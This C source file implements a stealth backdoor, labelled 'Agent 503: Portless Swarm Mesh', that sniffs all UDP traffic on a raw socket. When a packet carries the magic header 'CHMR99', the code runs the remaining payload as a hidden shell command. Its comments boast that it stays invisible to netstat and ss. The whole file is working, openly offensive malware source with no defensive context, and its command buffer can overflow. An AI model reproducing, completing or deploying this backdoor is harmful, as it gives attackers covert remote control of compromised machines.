#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

/* Agent 503: Portless Swarm Mesh.
   Uses SOCK_RAW to sniff incoming UDP packets. 
   Listens for a Magic Header to execute commands, 
   remaining invisible to netstat/ss.
*/

// The Swarm's Magic Signature
#define MAGIC_HEADER "CHMR99"
#define MAGIC_LEN 6

void execute_swarm_command(const char *cmd) {
    // In a full implementation, this routes to Agent 411 (Memfd Execution)
    // For the primitive, we execute via system() silently.
    printf("[\033[92mSWARM COMMAND RECEIVED\033[0m] Executing: %s\n", cmd);
    
    char full_cmd[1024];
    snprintf(full_cmd, sizeof(full_cmd), "%s > /dev/null 2>&1 &", cmd);
    system(full_cmd);
}

int main() {
    int raw_socket;
    unsigned char buffer[65536];
    
    printf("--- [AGENT 503: PORTLESS MESH LISTENER ACTIVE] ---\n");
    printf("[*] Sniffing for Swarm Magic Bytes. Invisible to netstat.\n");

    // Create a raw socket to sniff all UDP traffic
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (raw_socket < 0) {
        perror("Raw socket creation failed (Requires Root)");
        return 1;
    }

    while (1) {
        // Receive raw packets
        int data_size = recvfrom(raw_socket, buffer, sizeof(buffer), 0, NULL, NULL);
        if (data_size < 0) continue;

        // Parse IP Header (usually 20 bytes)
        struct iphdr *ip = (struct iphdr *)buffer;
        int ip_header_len = ip->ihl * 4;

        // Parse UDP Header (8 bytes)
        struct udphdr *udp = (struct udphdr *)(buffer + ip_header_len);
        
        // Calculate payload location
        unsigned char *payload = buffer + ip_header_len + sizeof(struct udphdr);
        int payload_len = data_size - ip_header_len - sizeof(struct udphdr);

        // Check for the Magic Header
        if (payload_len > MAGIC_LEN && memcmp(payload, MAGIC_HEADER, MAGIC_LEN) == 0) {
            // Extract command (skipping the magic header)
            char command[512];
            memset(command, 0, sizeof(command));
            strncpy(command, (char *)(payload + MAGIC_LEN), payload_len - MAGIC_LEN);
            
            // Strip trailing newlines/garbage
            command[strcspn(command, "\r\n")] = 0;
            
            execute_swarm_command(command);
        }
    }

    close(raw_socket);
    return 0;
}
